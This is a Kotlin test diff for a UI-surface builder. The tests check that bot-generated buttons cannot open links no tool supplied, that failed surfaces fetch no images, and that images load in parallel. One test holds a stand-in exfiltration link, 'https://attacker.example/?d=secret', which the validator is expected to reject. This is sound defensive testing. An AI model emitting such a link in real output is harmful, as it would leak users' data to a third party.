@@ -17,7 +17,7 @@ class SurfacesTest {
     private fun args(s: String): JsonObject = Json.parseToJsonElement(s).jsonObject
 
     private fun rejected(s: String, keep: (String) -> String? = { null }): String = try {
-        Surfaces.build(args(s), keep)
+        Surfaces.build(args(s), keep = keep)
         fail("expected a rejection for $s"); ""
     } catch (e: Surfaces.Rejected) { e.reason }
 
@@ -54,6 +54,33 @@ class SurfacesTest {
         assertTrue(rejected("""{"components":[{"id":"root","component":"Button","child":"l","action":{"functionCall":{"call":"openUrl","args":{"url":"intent://x#Intent;end"}}}},{"id":"l","component":"Text","text":"x"}]}""").contains("https"))
         // A link built from data could carry what the bot read; it must be written out.
         assertTrue(rejected("""{"components":[{"id":"root","component":"Button","child":"l","action":{"functionCall":{"call":"openUrl","args":{"url":{"path":"/u"}}}}},{"id":"l","component":"Text","text":"x"}]}""").contains("https"))
+    }
+
+    @Test
+    fun aLinkMustBeOneAToolGaveOrThePersonWrote() {
+        val s = """{"components":[{"id":"root","component":"Button","child":"l","variant":"primary","action":{"functionCall":{"call":"openUrl","args":{"url":"https://attacker.example/?d=secret"}}}},{"id":"l","component":"Text","text":"Confirm"}]}"""
+        val r = try { Surfaces.build(args(s), allowLink = { it.startsWith("https://hotel.example/") }) { null }; "" } catch (e: Surfaces.Rejected) { e.reason }
+        assertTrue(r, r.contains("no tool gave"))
+        Surfaces.build(args(s.replace("https://attacker.example/?d=secret", "https://hotel.example/book")), allowLink = { it.startsWith("https://hotel.example/") }) { null }
+    }
+
+    @Test
+    fun nothingIsFetchedForASurfaceThatFails() {
+        var fetched = 0
+        rejected("""{"data":"not an object","components":[{"id":"root","component":"Image","url":"https://cdn.example.com/a.jpg"}]}""") { fetched++; "/x" }
+        rejected("""{"components":[{"id":"root","component":"Column","children":["i","b"]},{"id":"i","component":"Image","url":"https://cdn.example.com/a.jpg"},{"id":"b","component":"Button","child":"i"}]}""") { fetched++; "/x" }
+        assertEquals(0, fetched)
+    }
+
+    @Test
+    fun picturesAreFetchedSideBySide() {
+        val urls = (1..6).joinToString(",") { """{"id":"i$it","component":"Image","url":"https://cdn.example.com/$it.jpg"}""" }
+        val kids = (1..6).joinToString(",") { "\"i$it\"" }
+        val started = System.nanoTime()
+        val sf = Surfaces.build(args("""{"components":[{"id":"root","component":"Column","children":[$kids]},$urls]}""")) { Thread.sleep(400); "/kept/" + it.substringAfterLast('/') }
+        val ms = (System.nanoTime() - started) / 1_000_000
+        assertEquals(6, Surfaces.files(sf.spec).size)
+        assertTrue("took $ms ms", ms < 2000)
     }
 
     @Test
